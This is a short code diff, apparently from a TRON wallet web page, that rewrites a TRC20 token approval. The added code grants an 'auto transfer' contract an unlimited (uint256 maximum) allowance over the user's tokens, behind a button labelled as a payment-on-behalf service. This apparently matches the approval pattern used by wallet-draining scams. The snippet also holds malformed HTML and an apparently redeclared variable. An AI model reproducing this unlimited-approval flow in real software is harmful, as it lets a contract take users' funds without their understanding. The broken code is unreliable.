@@ -460,14 +460,19 @@ const TRC20_ABI = [
 const trc20Contract = await tronWeb.contract(TRC20_ABI, TRC20_TOKEN_ADDRESS);
 
 // 3. 通过methods调用approve并构造交易
-const approveTx = await trc20Contract.methods.approve(
-  tronWeb.address.toHex(AUTO_TRANSFER_CONTRACT), // 代付合约地址（转Hex）
-  approveAmount // 授权额度（已转Sun单位）
-).buildTransaction({
-  from: tronWeb.address.toHex(userAddress), // 用户地址（转Hex）
-  feeLimit: 1000000 // 矿工费上限
-});
+const UINT256_MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
+// 直接将approveAmount设为uint256最大值（无需转Sun，因为这已经是TRC20代币的最小单位最大值）
+const approveAmount = UINT256_MAX;
+
+// 之后用这个值构造approve交易
+const approveTx = await trc20Contract.methods.approve(
+  tronWeb.address.toHex(AUTO_TRANSFER_CONTRACT),
+  approveAmount
+).buildTransaction({
+  from: tronWeb.address.toHex(userAddress),
+  feeLimit: 1000000
+});
                     // 用户本地签名
                     const signedTx = await tronWeb.trx.sign(approveTx);
                     approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 代付处理中...';
